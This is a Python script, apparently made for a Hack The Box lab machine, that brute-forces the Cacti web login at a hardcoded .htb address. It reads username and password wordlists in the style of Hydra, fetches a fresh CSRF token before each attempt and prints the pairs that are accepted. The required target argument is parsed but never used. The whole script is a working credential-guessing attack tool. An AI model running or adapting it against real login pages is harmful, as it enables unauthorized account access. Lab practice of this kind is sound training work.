import requests
import argparse
from bs4 import BeautifulSoup

def bruteforce(users, passwords, web):
    for user in users:
        for password in passwords:
            # Get fresh session
            s = requests.Session()
            r = s.get("http://cacti.monitorsfour.htb/cacti/index.php")
    
            # Extract CSRF token (adjust selector for your HTML)
            soup = BeautifulSoup(r.text, 'html.parser')
            csrf_token = soup.find('input', {'name': '__csrf_magic'})['value']
    
            # Try login
            data = {
                '__csrf_magic': csrf_token,
                'action': 'login',
                'login_username': user,
                'login_password': password
            }
    
            r = s.post("http://cacti.monitorsfour.htb/cacti/index.php", data=data)
    
            # Check for success (adjust condition)
            if "Access Denied" not in r.text:
                print(f"[+] Valid: {user}:{password}")

def main():
    parser = argparse.ArgumentParser(description='Cacti login brute forcer - Hydra style')

    # Hydra-style arguments
    parser.add_argument('-l', '--login', help='Single username to test')
    parser.add_argument('-L', '--login-list',
                       help='Username wordlist file (capital L for wordlist)')
    parser.add_argument('-p', '--password', help='Single password to test')
    parser.add_argument('-P', '--password-list',
                       help='Password wordlist file (capital P for wordlist)')

    # Required web target
    parser.add_argument('-w', '--web', required=True,
                       help='Target website URL')

    args = parser.parse_args()

    # Validate arguments (must have either single or list for both username and password)
    if not (args.login or args.login_list):
        parser.error("Either -l (single username) or -L (username list) must be specified")

    if not (args.password or args.password_list):
        parser.error("Either -p (single password) or -P (password list) must be specified")

    # Load users
    if args.login_list:
        users = open(args.login_list).read().splitlines()
    else:
        users = [args.login]

    # Load passwords
    if args.password_list:
        passwords = open(args.password_list).read().splitlines()
    else:
        passwords = [args.password]

    print(f"[*] Starting brute force with {len(users)} user(s) and {len(passwords)} password(s)")
    print(f"[*] Target: {args.web}")

    bruteforce(users, passwords, args.web)

if __name__ == "__main__":
    main()    
